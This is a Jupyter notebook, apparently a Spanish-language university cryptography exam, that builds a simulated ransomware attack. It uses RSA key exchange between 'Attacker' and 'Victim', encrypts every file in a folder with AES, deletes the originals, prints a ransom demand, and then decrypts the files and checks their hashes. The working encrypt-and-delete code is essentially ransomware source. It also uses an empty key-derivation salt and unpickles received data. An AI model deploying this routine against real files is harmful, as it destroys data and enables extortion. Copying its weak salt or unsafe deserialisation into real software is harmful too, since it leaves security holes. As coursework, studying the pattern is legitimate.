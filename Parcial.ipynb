{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Parcial Final Criptografia"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pycryptodome in ./.venv/lib/python3.12/site-packages (3.21.0)\n",
      "Note: you may need to restart the kernel to use updated packages.\n",
      "Requirement already satisfied: cryptography in ./.venv/lib/python3.12/site-packages (43.0.3)\n",
      "Requirement already satisfied: cffi>=1.12 in ./.venv/lib/python3.12/site-packages (from cryptography) (1.17.1)\n",
      "Requirement already satisfied: pycparser in ./.venv/lib/python3.12/site-packages (from cffi>=1.12->cryptography) (2.22)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "%pip install pycryptodome\n",
    "%pip install cryptography"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "from Crypto.PublicKey import RSA\n",
    "from Crypto.Cipher import PKCS1_OAEP, AES\n",
    "from Crypto.Hash import SHA256\n",
    "from Crypto.Signature import pkcs1_15\n",
    "from Crypto.Util.Padding import pad, unpad\n",
    "from Crypto.Random import get_random_bytes\n",
    "from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\n",
    "from cryptography.hazmat.backends import default_backend\n",
    "from cryptography.hazmat.primitives import hashes\n",
    "from cryptography.hazmat.primitives.kdf.scrypt import Scrypt\n",
    "import os\n",
    "import pickle\n",
    "import hashlib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def generate_rsa_keys():\n",
    "    return RSA.generate(2048)\n",
    "\n",
    "def create_certificate(key, identifier):\n",
    "    public_key = key.publickey().export_key()\n",
    "    return {'id': identifier, 'pk': public_key}\n",
    "\n",
    "def sign_data(private_key, data):\n",
    "    h = SHA256.new(data)\n",
    "    signature = pkcs1_15.new(private_key).sign(h)\n",
    "    return signature\n",
    "\n",
    "def verify_signature(public_key, data, signature):\n",
    "    h = SHA256.new(data)\n",
    "    try:\n",
    "        pkcs1_15.new(public_key).verify(h, signature)\n",
    "        return True\n",
    "    except (ValueError, TypeError):\n",
    "        return False\n",
    "\n",
    "def encrypt_rsa(public_key, data):\n",
    "    cipher = PKCS1_OAEP.new(public_key)\n",
    "    return cipher.encrypt(data)\n",
    "\n",
    "def decrypt_rsa(private_key, encrypted_data):\n",
    "    cipher = PKCS1_OAEP.new(private_key)\n",
    "    return cipher.decrypt(encrypted_data)\n",
    "\n",
    "def generate_random_bytes():\n",
    "    return get_random_bytes(1024)\n",
    "\n",
    "def generate_aes_key_from_password(password: bytes, salt: bytes = None) -> bytes:\n",
    "    if salt is None:\n",
    "          salt = b''  # Utiliza un salt vacío si no se proporciona uno\n",
    "    # Parámetros de PBKDF2\n",
    "    kdf = PBKDF2HMAC(\n",
    "        algorithm=hashes.SHA256(),\n",
    "        length=32,  # Genera una llave AES de 256 bits\n",
    "        salt=salt,\n",
    "        iterations=100000,\n",
    "        backend=default_backend()\n",
    "    )\n",
    "    key = kdf.derive(password)\n",
    "    return key\n",
    "\n",
    "def encrypt_file(file_path, aes_key):\n",
    "    block_size = AES.block_size\n",
    "    with open(file_path, 'rb') as file:\n",
    "        file_data = file.read()\n",
    "    cipher = AES.new(aes_key, AES.MODE_CBC)\n",
    "    ciphered_data = cipher.encrypt(pad(file_data, block_size))\n",
    "    iv = cipher.iv\n",
    "    enc_file_path = file_path + '.enc'\n",
    "    with open(enc_file_path, 'wb') as enc_file:\n",
    "        enc_file.write(iv + ciphered_data)  # Save IV and ciphered data together\n",
    "    os.remove(file_path)\n",
    "    return enc_file_path\n",
    "\n",
    "\n",
    "def decrypt_file(encrypted_file_path, aes_key):\n",
    "    with open(encrypted_file_path, 'rb') as enc_file:\n",
    "        file_content = enc_file.read()\n",
    "\n",
    "    iv = file_content[:AES.block_size]\n",
    "    ciphered_data = file_content[AES.block_size:]\n",
    "\n",
    "    cipher = AES.new(aes_key, AES.MODE_CBC, iv)\n",
    "    plaintext = unpad(cipher.decrypt(ciphered_data), AES.block_size)\n",
    "\n",
    "    orig_file_path = encrypted_file_path.replace('.enc', '')\n",
    "    with open(orig_file_path, 'wb') as dec_file:\n",
    "        dec_file.write(plaintext)\n",
    "    os.remove(encrypted_file_path)\n",
    "    return orig_file_path\n",
    "\n",
    "def calculate_file_hash(file_path):\n",
    "    hash_sha256 = hashlib.sha256()\n",
    "    with open(file_path, 'rb') as file:\n",
    "        for chunk in iter(lambda: file.read(4096), b\"\"):\n",
    "            hash_sha256.update(chunk)\n",
    "    return hash_sha256.hexdigest()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Paso 1: Generar llaves RSA y crear certificados\n",
    "attacker_key = generate_rsa_keys()\n",
    "victim_key = generate_rsa_keys()\n",
    "attacker_cert = create_certificate(attacker_key, \"Attacker\")\n",
    "victim_cert = create_certificate(victim_key, \"Victim\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Paso 2: Intercambiar y verificar llaves\n",
    "llaves_corto_plazo = generate_rsa_keys()\n",
    "pk = llaves_corto_plazo.public_key().export_key()\n",
    "\n",
    "#PARTE DE P\n",
    "sigma1 = sign_data(victim_key, pk)\n",
    "\n",
    "#PARTE DE Q\n",
    "idP = victim_cert['id']\n",
    "pkP = victim_cert['pk']\n",
    "if (verify_signature(RSA.import_key(pkP),pk,sigma1)):\n",
    "  k = os.urandom(128)\n",
    "  dupla = pickle.dumps((k, attacker_cert['id']))\n",
    "  c = encrypt_rsa(RSA.import_key(pk),dupla)\n",
    "  tupla = pickle.dumps((pk,c,idP))\n",
    "  sigma2 = sign_data(attacker_key, tupla)\n",
    "\n",
    "#PARTE DE P\n",
    "idQ = attacker_cert['id']\n",
    "pkQ = attacker_cert['pk']\n",
    "if (verify_signature(RSA.import_key(pkQ),tupla,sigma2)):\n",
    "  mp = decrypt_rsa(RSA.import_key(llaves_corto_plazo.export_key()),c)\n",
    "  try:\n",
    "      # Intenta deserializar los datos\n",
    "      deserialized_data = pickle.loads(mp)\n",
    "  except pickle.UnpicklingError as e:\n",
    "      print(\"Error al deserializar los datos:\", e)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Parcial.ipynb  README.md  sample_data\n"
     ]
    }
   ],
   "source": [
    "!ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Archivo hola.txt cifrado como ./sample_data/hola.txt.enc.\n",
      "Todos sus archivos se han cifrado. Envien dinero a direccion colombiana 123 o si no no la recuperara.\n"
     ]
    }
   ],
   "source": [
    "# Paso 3: Generar llave AES y cifrar archivos\n",
    "aes_key = generate_aes_key_from_password(k)\n",
    "sample_data_dir = './sample_data'\n",
    "files = os.listdir(sample_data_dir)\n",
    "\n",
    "file_hashes = {}\n",
    "for file_name in files:\n",
    "    file_path = os.path.join(sample_data_dir, file_name)\n",
    "    file_hashes[file_name] = calculate_file_hash(file_path)\n",
    "    enc_file_path = encrypt_file(file_path, aes_key)\n",
    "    print(f\"Archivo {file_name} cifrado como {enc_file_path}.\")\n",
    "\n",
    "hashes_file_path = os.path.join(sample_data_dir, 'file_hashes.pkl')\n",
    "with open(hashes_file_path, 'wb') as hash_file:\n",
    "    pickle.dump(file_hashes, hash_file)\n",
    "# Paso 4: Notificar a las victimas.\n",
    "print(\"Todos sus archivos se han cifrado. Envien dinero a direccion colombiana 123 o si no no la recuperara.\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Archivo ./sample_data/hola.txt descifrado e íntegro.\n"
     ]
    }
   ],
   "source": [
    "#Paso 5\n",
    "\n",
    "# Cargar los hashes originales desde el archivo\n",
    "hashes_file_path = os.path.join(sample_data_dir, 'file_hashes.pkl')\n",
    "with open(hashes_file_path, 'rb') as hash_file:\n",
    "    file_hashes = pickle.load(hash_file)\n",
    "\n",
    "\n",
    "for enc_file_name in files:\n",
    "    encrypted_file_path = os.path.join(sample_data_dir, enc_file_name + '.enc')\n",
    "    orig_file_path = decrypt_file(encrypted_file_path, aes_key)\n",
    "\n",
    "    # Calcular el hash del archivo descifrado\n",
    "    recalculated_hash = calculate_file_hash(orig_file_path)\n",
    "\n",
    "    # Obtener el hash original\n",
    "    original_hash = file_hashes.get(enc_file_name)\n",
    "\n",
    "    # Verificar la integridad del archivo\n",
    "    if recalculated_hash == original_hash:\n",
    "        print(f\"Archivo {orig_file_path} descifrado e íntegro.\")\n",
    "    else:\n",
    "        print(f\"Archivo {orig_file_path} descifrado pero no íntegro.\")\n",
    "\n",
    "# Eliminar el archivo de hashes después de la verificación\n",
    "os.remove(hashes_file_path)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
